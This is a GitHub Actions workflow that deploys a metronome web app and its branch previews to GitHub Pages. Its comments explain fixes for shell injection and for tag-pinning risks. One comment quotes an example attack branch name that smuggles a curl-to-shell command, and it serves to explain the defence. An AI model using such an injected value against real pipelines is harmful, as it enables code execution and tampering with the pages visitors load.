name: Deploy

on:
  push:
    branches: ['**']
  workflow_dispatch:

permissions:
  contents: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-node@v7
        with:
          node-version: 24

      - run: npm ci

      - name: Set base path
        # The branch name reaches the script as an environment variable, never
        # as text spliced into it. `${{ }}` is substituted before the shell
        # runs, and a git ref may legally contain $, backticks, parentheses and
        # semicolons — so a branch named `x$(curl evil.sh|sh)` used to execute
        # on a runner holding a contents:write token, which is push access to
        # gh-pages and therefore to what every visitor's browser runs. The
        # sanitize below never protected against this: it ran after the
        # substitution had already happened.
        env:
          BRANCH: ${{ github.ref_name }}
        run: |
          if [ "$BRANCH" = "main" ]; then
            echo "VITE_BASE_PATH=/metronome/" >> "$GITHUB_ENV"
            echo "DEST_DIR=." >> "$GITHUB_ENV"
          else
            # One sanitized name, used for both the URL and the publish
            # directory. They were derived separately before — the base path
            # sanitized, the directory raw — so a branch like `feature/x`
            # published to preview/feature/x/ while the app looked for its
            # assets under preview/feature-x/, and the preview loaded blank.
            # printf rather than echo: echo mangles backslashes and leading
            # dashes in some shells.
            SAFE_BRANCH=$(printf '%s' "$BRANCH" | sed 's/[^a-zA-Z0-9._-]/-/g')
            echo "VITE_BASE_PATH=/metronome/preview/${SAFE_BRANCH}/" >> "$GITHUB_ENV"
            echo "DEST_DIR=preview/${SAFE_BRANCH}" >> "$GITHUB_ENV"
          fi

      - name: Install rsvg-convert
        run: sudo apt-get install -y librsvg2-bin

      - run: npm run build

      - name: Deploy to GitHub Pages
        # Pinned to a commit, not the @v4 tag. This is third-party code that
        # runs with GITHUB_TOKEN and contents:write — push access to gh-pages,
        # which is the JavaScript every visitor of the site executes. A major
        # version tag is mutable: the author repoints it at each release, so
        # @v4 is a promise about semantics, not about the code that will run.
        # Anyone able to move that tag, or to push to the repo behind it, would
        # otherwise be running arbitrary code in this job.
        #
        # The trade is that security fixes no longer arrive on their own. Bump
        # it deliberately — `git ls-remote --tags` on the repo shows where the
        # tag points now, and Dependabot can raise the PR if configured.
        uses: peaceiris/actions-gh-pages@84c30a85c19949d7eee79c4ff27748b70285e453 # v4.1.0
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./dist
          destination_dir: ${{ env.DEST_DIR }}
          keep_files: true  # prevents branches from wiping each other
